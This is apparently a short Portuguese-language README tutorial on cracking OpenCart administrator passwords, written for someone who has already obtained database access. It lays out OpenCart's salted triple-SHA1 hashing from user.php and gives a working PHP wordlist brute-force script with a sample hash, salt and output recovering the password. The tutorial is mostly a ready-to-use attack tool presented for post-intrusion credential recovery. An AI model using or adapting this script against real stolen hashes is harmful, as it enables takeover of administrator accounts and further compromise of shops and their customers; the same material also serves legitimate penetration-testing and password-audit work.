# Brute force attack in OpenCart stored passwords.
Nesse pequeno tutorial eu ensino como realizar um ataque de força bruta baseado em lista de palavras em senhas armazenadas no banco de dados do OpenCart


## CENÁRIO:
- Você conseguiu acesso ao banco de dados de uma determinada aplicação que usa OpenCart.
- Você consulta a Hash e o Salt da senha na tabela do administrator e obtém o seguinte resultado:

| password      						  | salt    | email             | status | username    | lastname | ip        | firstname |
|-----------------------------------------|---------|-------------------|--------|-------------|----------|-----------|-----------|
|f2e9efd4a366507c5b1cba7749659d93d61ae335 |oInuc412L| admin@pentest-server.com 	| 1      | Admin       | das ganbi| 127.0.0.1 | developer |


## PROBLEMA:
Você não conhece o sistema de criptografia de senhas do OpenCart, Então você vai tentar desvendar essa HASH com força bruta comum usando criptografia SHA1.

```php
#exemple:

<?php
$salt = "oInuc412L";
$password = "f2e9efd4a366507c5b1cba7749659d93d61ae335";

$lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
foreach($lines as $string)
{
   $hashed=SHA1($string);
   if($hashed==$password){echo "SENHA: ".$string;} else{}
}
?>
```


O problema é que `$password` (A senha do admin) não é simplesmente uma string criptografada com SHA1.
Logo um script de força bruta baseada nesse tipo de criptografia dificilmente geraria uma HASH igual a senha criptografada do admin que você quer "desvendar".

## SOLUÇÃO:

SE OLHARMOS O ARQUIVO PHP QUE FAZ A AUTENTICAÇÃO DO ADMIN NO OPENCART
`\opencart\system\library\user.php`

ENCONTRAMOS O SEGUINTE CÓDIGO:
```
$user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");
```

A PARTE QUE NOS INTERESSA:
```
password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "')
```

ADAPTANDO O CÓDIGO TEMOS:
```
$password=SHA1($salt.SHA1($salt.SHA1($password)));
```

obs: ignorei a parte `OR password = '" . $this->db->escape(md5($password)) . "')` já que testamos nossa hash e já sabemos que é SHA1, certo?

## Agora já sabemos como devemos criptografar a strings da nossa wordlist para comparar com a Hash do Admin

Um script simples em php para testar força bruta em senhas OpenCart ficaria assim:


```php
#exemple:

<?php
$salt = "oInuc412L";
$password = "f2e9efd4a366507c5b1cba7749659d93d61ae335";

$lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
foreach($lines as $string)
{
   $hashed=SHA1($salt.SHA1($salt.SHA1($string)));
   if($hashed==$password){echo "SENHA: ".$string;} else{}
}
?>
```

```
C:\Users\demo\open-cript-master>php opencript.php
SENHA: 12345
```

###### _NEED ME? [pablov3rlly gmail com]_
